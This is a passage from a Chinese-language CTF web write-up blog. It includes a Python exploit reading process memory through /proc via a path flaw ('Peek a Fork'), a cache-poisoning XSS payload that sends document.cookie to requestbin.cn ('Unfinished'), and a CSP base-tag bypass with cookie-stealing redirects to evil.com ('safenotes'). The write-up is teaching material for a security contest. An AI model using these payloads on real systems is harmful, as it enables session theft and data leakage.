s2.close()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解析PID</span></span><br><span class="line">    status_text = status_response.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Status response:&quot;</span>, status_text)</span><br><span class="line">    </span><br><span class="line">    pid_match = re.search(<span class="string">r&quot;Pid:\s*(\d+)&quot;</span>, status_text)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pid_match:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;未获取到PID&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    pid = <span class="built_in">int</span>(pid_match.group(<span class="number">1</span>))+<span class="number">1</span></span><br><span class="line">    pid=<span class="built_in">str</span>(pid)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;当前子进程PID：<span class="subst">&#123;pid&#125;</span>&quot;</span>)</span><br><span class="line">    s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s1.connect((target_ip, target_port))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送长时间运行的请求</span></span><br><span class="line">    long_request = <span class="string">b&quot;GET /?log=1&amp;factor=10000000000000 HTTP/1.1\r\nHost: localhost\r\n\r\n&quot;</span></span><br><span class="line">    s1.sendall(long_request)</span><br><span class="line">    <span class="comment"># 第三步：获取maps文件</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[3] 获取内存映射...&quot;</span>)</span><br><span class="line">    s3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s3.connect((target_ip, target_port))</span><br><span class="line">    </span><br><span class="line">    maps_request = <span class="string">b&quot;GET /.?offset=0&amp;length=50000.?offset=0&amp;length=500/pro?offset=0&amp;length=500c/&quot;</span>+pid.encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&quot;/maps HTTP/1.1\r\nHost: localhost\r\n\r\n&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(maps_request)</span><br><span class="line">    s3.sendall(maps_request)</span><br><span class="line">    </span><br><span class="line">    maps_response = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = s3.recv(<span class="number">4096</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        maps_response += data</span><br><span class="line">    </span><br><span class="line">    s3.close()</span><br><span class="line">    </span><br><span class="line">    maps_text = maps_response.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Maps response:&quot;</span>, maps_text)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 查找匿名内存区域（mmap创建的）</span></span><br><span class="line">    mem_pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;([0-9a-f]+)-([0-9a-f]+)\s+rw-s&quot;</span>, re.MULTILINE)</span><br><span class="line">    matches = mem_pattern.findall(maps_text)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> matches:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;未找到匿名内存区域，尝试其他模式...&quot;</span>)</span><br><span class="line">        <span class="comment"># 尝试其他模式</span></span><br><span class="line">        mem_pattern2 = re.<span class="built_in">compile</span>(<span class="string">r&quot;([0-9a-f]+)-([0-9a-f]+)\s+rw-p&quot;</span>, re.MULTILINE)</span><br><span class="line">        matches = mem_pattern2.findall(maps_text)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> matches:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;未找到任何内存区域&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 取第一个匹配的区域</span></span><br><span class="line">    start_hex, end_hex = matches[<span class="number">0</span>]</span><br><span class="line">    start_offset = <span class="built_in">int</span>(start_hex, <span class="number">16</span>)</span><br><span class="line">    end_offset = <span class="built_in">int</span>(end_hex, <span class="number">16</span>)</span><br><span class="line">    read_length = <span class="built_in">min</span>(<span class="number">100</span>, end_offset - start_offset)  <span class="comment"># 只读前100字节</span></span><br><span class="line">    </span><br><span class="line">    start_offset=(<span class="built_in">str</span>(start_offset)).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    read_length=(<span class="built_in">str</span>(read_length)).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;找到内存区域：<span class="subst">&#123;start_hex&#125;</span>-<span class="subst">&#123;end_hex&#125;</span>，读取偏移：<span class="subst">&#123;start_offset&#125;</span>，长度：<span class="subst">&#123;read_length&#125;</span>&quot;</span>)</span><br><span class="line">    s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s1.connect((target_ip, target_port))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送长时间运行的请求</span></span><br><span class="line">    long_request = <span class="string">b&quot;GET /?log=1&amp;factor=10000000000000 HTTP/1.1\r\nHost: localhost\r\n\r\n&quot;</span></span><br><span class="line">    s1.sendall(long_request)</span><br><span class="line">    <span class="comment"># 第四步：读取内存内容</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[4] 读取内存内容...&quot;</span>)</span><br><span class="line">    s4 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s4.connect((target_ip, target_port))</span><br><span class="line">    </span><br><span class="line">    mem_request = <span class="string">b&quot;GET /.?offset=&quot;</span>+start_offset+<span class="string">b&quot;&amp;length=&quot;</span>+read_length+<span class="string">b&quot;.?offset=0&amp;length=500/pro?offset=0&amp;length=500c/&quot;</span>+pid.encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&quot;/mem HTTP/1.1\r\nHost: localhost\r\n\r\n&quot;</span></span><br><span class="line">    s4.sendall(mem_request)</span><br><span class="line">    </span><br><span class="line">    mem_response = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = s4.recv(<span class="number">4096</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        mem_response += data</span><br><span class="line">    </span><br><span class="line">    s4.close()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提取flag</span></span><br><span class="line">    mem_text = mem_response.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;内存内容:&quot;</span>, <span class="built_in">repr</span>(mem_text))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 查找flag</span></span><br><span class="line">    flag_match = re.search(<span class="string">r&quot;flag\&#123;[^&#125;]+\&#125;&quot;</span>, mem_text)</span><br><span class="line">    <span class="keyword">if</span> flag_match:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;🎉 成功获取flag：<span class="subst">&#123;flag_match.group()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;未找到flag，尝试其他偏移...&quot;</span>)</span><br><span class="line">        <span class="comment"># 可以尝试其他偏移量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure></div>
+<p>即，先读取&#x2F;proc&#x2F;self&#x2F;status，获取pid，再读取&#x2F;proc&#x2F;[pid]&#x2F;maps，获取flag内存映射，最后读取&#x2F;proc&#x2F;[pid]&#x2F;mem，前者获得偏移，即可获取flag<br>最后也是拿到flag<br><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250914215732395.png"><br><code>flag&#123;7c54a0ae-4d0b-4aba-87ca-770fb076d625&#125;</code></p>
+<h2 id="Unfinished"><a href="#Unfinished" class="headerlink" title="Unfinished"></a>Unfinished</h2><p>缓存投毒+xss<br>看nginx配置文件可以发现，被禁了<code>/api/bio/&lt;username&gt;</code><br>我们换成1.js这种文件名就行了<br>即注册进去，改个bio（注意只有第一次生效）<br>然后&#x2F;api&#x2F;bio&#x2F;1.js直接可以xss<br>而且缓存投毒，也绕过了鉴权<br>即这样也绕过了bot的限制，毕竟它的session是admin，一般来讲读不了其他用户的bio<br>外带即可<br><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250914215838764.png"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&quot;http://requestbin.cn:80/13ddlbv1?flag=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">flag&#123;yOU_F1n15HeD_Th3_unFInisH3D_cHalLen93_Jynh5&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="safenotes"><a href="#safenotes" class="headerlink" title="safenotes"></a>safenotes</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>赛中不太会，对于xss的理解一直不太够，其实想来题目糅合的东西不多，主要是CSP的baseurl绕过，我们简单复现一下<br>该题可以用编码绕过&#x2F;preview  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u003cscript\u003ealert(1)\u003c/scirpt\u003e</span><br></pre></td></tr></table></figure></div>
+
+<p>本地没csp试了可以打xss  </p>
+<p>如何绕过CSP呢？</p>
+<p>关注一下baseurl实现  </p>
+<p>当服务器CSP script-src采用了nonce时，如果只设置了default-src没有额外设置base-uri，就可以使用<code>&lt;base&gt;</code>标签使当前页面上下文为自己的vps，如果页面中的合法script标签采用了相对路径，那么最终加载的js就是针对base标签中指定url的相对路径</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#x27;self&#x27;; script-src &#x27;nonce-test&#x27;&quot;&gt;</span><br><span class="line">&lt;base href=&quot;//vps_ip/&quot;&gt;</span><br><span class="line">&lt;script nonce=&#x27;test&#x27; src=&quot;2.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>当出现相对路径的时候无论是文件还是路由，我们都可以在可行的时候利用这个方法，实现绕过<br>比如，题目当前有跳转&#x2F;preview<br>我们设置当前的baseurl,然后bot访问时会自动跳转<br>即，现在只要在vps上开个服务将即可<br>我以为&#x2F;prview会自动到vps上执行任意js代码，实际发现并无任何交互，这里应该是xss是在innerHTML上，不影响其上的<code>&lt;scipt&gt; src=&quot;/preview&quot;</code><br>后续又想了一下，也是恍然大悟了，innerHTML可以影响，前提是需要我们再载入一个src<br>vps返回alert(1<br>也是成功了<img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251026113335686.png"></p>
+<p>再者就是重定向拿flag  </p>
+<p>fetch被禁了，就使用</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.location = &#x27;http://yourserver.com/leak?data=&#x27; + encodeURIComponent(document.querySelector(&#x27;pre&#x27;).innerText);</span><br><span class="line">location.href = &#x27;http://evil.com/steal?data=&#x27; + document.cookie;</span><br></pre></td></tr></table></figure></div>
+
+<p>即可拿到bot的Cookie</p>
+<p>明确xss的一些概念对于理解考点很重要，不然会很纷杂乱，xss很多东西</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/categories">Categ0r1es</a></li>
+        
+          <li><a href="/archives/">Artic1es</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">Searh</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#online-unzipper"><span class="toc-number">2.</span> <span class="toc-text">online_unzipper</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ping"><span class="toc-number">3.</span> <span class="toc-text">ping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Peek-a-Fork"><span class="toc-number">4.</span> <span class="toc-text">Peek a Fork</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E8%AF%BB"><span class="toc-number">4.1.</span> <span class="toc-text">实现任意读</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E5%86%85%E5%AD%98%E4%B8%AD%E8%AF%BBflag"><span class="toc-number">4.2.</span> <span class="toc-text">从内存中读flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unfinished"><span class="toc-number">5.</span> <span class="toc-text">Unfinished</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#safenotes"><span class="toc-number">6.</span> <span class="toc-text">safenotes</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">6.1.</span> <span class="toc-text">分析</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/n1CTF-web-WP/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/n1CTF-web-WP/&text=n1juniorCTF-web-WP"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/n1CTF-web-WP/&title=n1juniorCTF-web-WP"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/n1CTF-web-WP/&is_video=false&description=n1juniorCTF-web-WP"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=n1juniorCTF-web-WP&body=Check out this article: https://hexo.sheep-sys-sudo.top/n1CTF-web-WP/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/n1CTF-web-WP/&title=n1juniorCTF-web-WP"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/n1CTF-web-WP/&title=n1juniorCTF-web-WP"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/n1CTF-web-WP/&title=n1juniorCTF-web-WP"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/n1CTF-web-WP/&title=n1juniorCTF-web-WP"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/n1CTF-web-WP/&name=n1juniorCTF-web-WP&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/n1CTF-web-WP/&t=n1juniorCTF-web-WP"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Sh_eePppp
+  </div>
+
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">h0me</a></li><!--
+    --><!--
+      --><li><a href="/categories">Categ0r1es</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Artic1es</a></li><!--
+    --><!--
+      --><li><a href="/links/">L1nks</a></li><!--
+    --><!--
+      --><li><a href="/search/">Searh</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+
+  <!-- 邮箱信息独立出来，靠右下角 -->
+  <div class="footer-contact">
+    如果文章出现错误，可以联系我进行更改，感谢 
+    <a href="mailto:sh_eepppp@qq.com  ：）">sh_eepppp@qq.com</a>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
